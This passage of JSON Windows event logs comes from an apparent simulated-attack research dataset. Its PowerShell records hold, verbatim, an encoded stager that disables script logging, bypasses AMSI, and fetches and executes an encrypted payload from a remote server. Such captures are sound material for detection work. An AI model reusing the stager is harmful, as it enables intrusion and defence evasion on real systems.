Address:\t172.18.38.5\r\n\tDestination Port:\t\t53\r\n\tProtocol:\t\t17\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t67835\r\n\tLayer Name:\t\tReceive/Accept\r\n\tLayer Run-Time ID:\t44","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:48.995Z","LayerRTID":"44","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"53","ThreadID":2112,"RecordNumber":9020770}
{"Task":12810,"Direction":"%%14592","Opcode":"Info","SourcePort":"65336","FilterRTID":"67835","LayerName":"%%14610","EventReceivedTime":"2020-07-22 00:18:48","port":55069,"RemoteUserID":"S-1-0-0","SeverityValue":2,"Keywords":-9214364837600034816,"ProviderGuid":"{54849625-5478-4994-A5BA-3E3B0328C30D}","@version":"1","RemoteMachineID":"S-1-0-0","SourceModuleType":"im_msvistalog","Version":1,"tags":["mordorDataset"],"SourceName":"Microsoft-Windows-Security-Auditing","SourceAddress":"172.18.38.6","ProcessId":"3484","DestAddress":"172.18.38.5","Protocol":"17","Channel":"Security","SourceModuleName":"eventlog","Application":"\\device\\harddiskvolume4\\windows\\system32\\dns.exe","Message":"The Windows Filtering Platform has permitted a connection.\r\n\r\nApplication Information:\r\n\tProcess ID:\t\t3484\r\n\tApplication Name:\t\\device\\harddiskvolume4\\windows\\system32\\dns.exe\r\n\r\nNetwork Information:\r\n\tDirection:\t\tInbound\r\n\tSource Address:\t\t172.18.38.6\r\n\tSource Port:\t\t65336\r\n\tDestination Address:\t172.18.38.5\r\n\tDestination Port:\t\t53\r\n\tProtocol:\t\t17\r\n\r\nFilter Information:\r\n\tFilter Run-Time ID:\t67835\r\n\tLayer Name:\t\tReceive/Accept\r\n\tLayer Run-Time ID:\t44","Category":"Filtering Platform Connection","@timestamp":"2020-07-22T04:18:48.995Z","LayerRTID":"44","Hostname":"MORDORDC.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":4,"EventType":"AUDIT_SUCCESS","OpcodeValue":0,"EventTime":"2020-07-22 00:18:46","Severity":"INFO","EventID":5156,"DestPort":"53","ThreadID":2112,"RecordNumber":9020771}
{"Task":8,"EventReceivedTime":"2020-07-22 00:18:48","Opcode":"Info","port":55069,"SeverityValue":2,"Keywords":36028797018963968,"@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceName":"PowerShell","Channel":"Windows PowerShell","SourceModuleName":"eventlog","Message":"Pipeline execution details for command line:             Start-Sleep -Seconds $sleepTime;\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=11254\r\n\r\n\tUserId=MORDOR\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=78f49efe-32de-4c99-80f6-3f5158742484\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=            Start-Sleep -Seconds $sleepTime;\n \r\n\r\nDetails: \r\nCommandInvocation(Start-Sleep): \"Start-Sleep\"\r\nParameterBinding(Start-Sleep): name=\"Seconds\"; value=\"5\"\r\n","Category":"Pipeline Execution Details","@timestamp":"2020-07-22T04:18:48.995Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":0,"EventType":"INFO","EventTime":"2020-07-22 00:18:48","Severity":"INFO","EventID":800,"ThreadID":0,"RecordNumber":8970}
{"Task":8,"EventReceivedTime":"2020-07-22 00:18:48","Opcode":"Info","port":55069,"SeverityValue":2,"Keywords":36028797018963968,"@version":"1","SourceModuleType":"im_msvistalog","tags":["mordorDataset"],"SourceName":"PowerShell","Channel":"Windows PowerShell","SourceModuleName":"eventlog","Message":"Pipeline execution details for command line:         $IV=[BitConverter]::GetBytes($(Get-Random));\n. \r\n\r\nContext Information: \r\n\tDetailSequence=1\r\n\tDetailTotal=1\r\n\r\n\tSequenceNumber=11256\r\n\r\n\tUserId=MORDOR\\pgustavo\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.18362.752\r\n\tHostId=ca33ee8b-7d2f-4343-83bb-33cd9ad23223\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAHIAcwBJAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAUwBJAE8AbgAuAE0AQQBKAG8AUgAgAC0ARwBlACAAMwApAHsAJAA1ADcAYQBmADAAPQBbAHIAZQBGAF0ALgBBAHMAUwBFAE0AQgBsAFkALgBHAEUAdABUAHkAUABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkAZgAoACQANQA3AGEAZgAwACkAewAkADQAOABhAGMANgA9ACQANQA3AEEAZgAwAC4ARwBFAHQAVgBhAEwAdQBlACgAJABuAHUATABsACkAOwBJAGYAKAAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEATAA9AFsAQwBvAGwATABFAEMAVABpAE8ATgBzAC4ARwBlAE4ARQByAGkAYwAuAEQAaQBjAFQAaQBPAG4AYQByAFkAWwBzAHQAUgBpAE4ARwAsAFMAWQBTAFQAZQBNAC4ATwBCAGoAZQBjAHQAXQBdADoAOgBuAEUAVwAoACkAOwAkAFYAQQBMAC4AQQBEAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAYwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMAZQB7AFsAUwBDAFIASQBwAHQAQgBsAE8AYwBLAF0ALgAiAEcAZQB0AEYAaQBlAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATABVAEUAKAAkAE4AdQBsAEwALAAoAE4ARQBXAC0ATwBCAEoARQBDAFQAIABDAG8ATABsAGUAYwB0AEkATwBuAFMALgBHAEUATgBFAFIAaQBDAC4ASABBAHMAaABTAEUAdABbAFMAdAByAEkATgBHAF0AKQApAH0AJABSAEUAZgA9AFsAUgBFAGYAXQAuAEEAUwBzAGUAbQBCAGwAeQAuAEcAZQB0AFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBJAGUATABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAEEAbAB1AGUAKAAkAG4AdQBMAGwALAAkAHQAcgBVAGUAKQA7AH0AOwBbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBTAEUAUgB2AGkAYwBFAFAAbwBJAG4AVABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABQAEUAQwBUADEAMAAwAEMAbwBOAFQASQBuAHUARQA9ADAAOwAkAGEAOQA0ADgANgA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAHkAcwBUAEUAbQAuAE4ARQB0AC4AVwBlAGIAQwBsAEkARQBOAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQB4AFQALgBFAG4AQwBPAGQAaQBuAGcAXQA6ADoAVQBOAEkAQwBvAGQARQAuAEcARQBUAFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgB0AF0AOgA6AEYAUgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIAaQBOAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABBADkANAA4ADYALgBIAGUAYQBkAEUAcgBzAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABhADkANAA4ADYALgBQAFIATwBYAFkAPQBbAFMAeQBTAHQARQBtAC4ATgBlAFQALgBXAGUAYgBSAGUAUQB1AGUAcwB0AF0AOgA6AEQAZQBGAGEAVQBsAFQAVwBFAEIAUAByAE8AWABZADsAJABhADkANAA4ADYALgBQAFIATwBYAFkALgBDAFIAZQBkAEUATgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAUwBUAEUAbQAuAE4ARQB0AC4AQwByAGUARABFAE4AdABpAEEAbABDAGEAQwBIAGUAXQA6ADoARABFAGYAYQBVAEwAdABOAGUAdAB3AG8AUgBrAEMAUgBFAEQAZQBOAHQASQBBAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAFQARQBtAC4AVABlAFgAVAAuAEUAbgBDAG8ARABpAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAdABFAHMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwBVAE4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAEEAOQA0ADgANgAuAEgARQBBAEQAZQBSAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AGsAaABlAFQAegBZAGsAYgAyAFoATABJAEoAaQB0AGMANwBaAFgAbAA0AHgAeABzAHkAaABjAD0AIgApADsAJABkAGEAdABBAD0AJABhADkANAA4ADYALgBEAE8AdwBOAGwAbwBhAGQARABhAHQAQQAoACQAcwBlAFIAKwAkAFQAKQA7ACQASQB2AD0AJABEAEEAVABhAFsAMAAuAC4AMwBdADsAJABEAGEAVABhAD0AJABEAEEAVABhAFsANAAuAC4AJABkAGEAdABBAC4AbABFAG4ARwB0AGgAXQA7AC0AagBPAGkAbgBbAEMASABhAFIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=\r\n\tEngineVersion=5.1.18362.752\r\n\tRunspaceId=78f49efe-32de-4c99-80f6-3f5158742484\r\n\tPipelineId=1\r\n\tScriptName=\r\n\tCommandLine=        $IV=[BitConverter]::GetBytes($(Get-Random));\n \r\n\r\nDetails: \r\nCommandInvocation(Get-Random): \"Get-Random\"\r\n","Category":"Pipeline Execution Details","@timestamp":"2020-07-22T04:18:48.996Z","Hostname":"WORKSTATION5.mordor.local","host":"wec.internal.cloudapp.net","ExecutionProcessID":0,"EventType":"INFO","EventTime":"2020-07-22 00:18:48","Severity":"INFO","EventID":800,"ThreadID":0,"RecordNumber":8971}
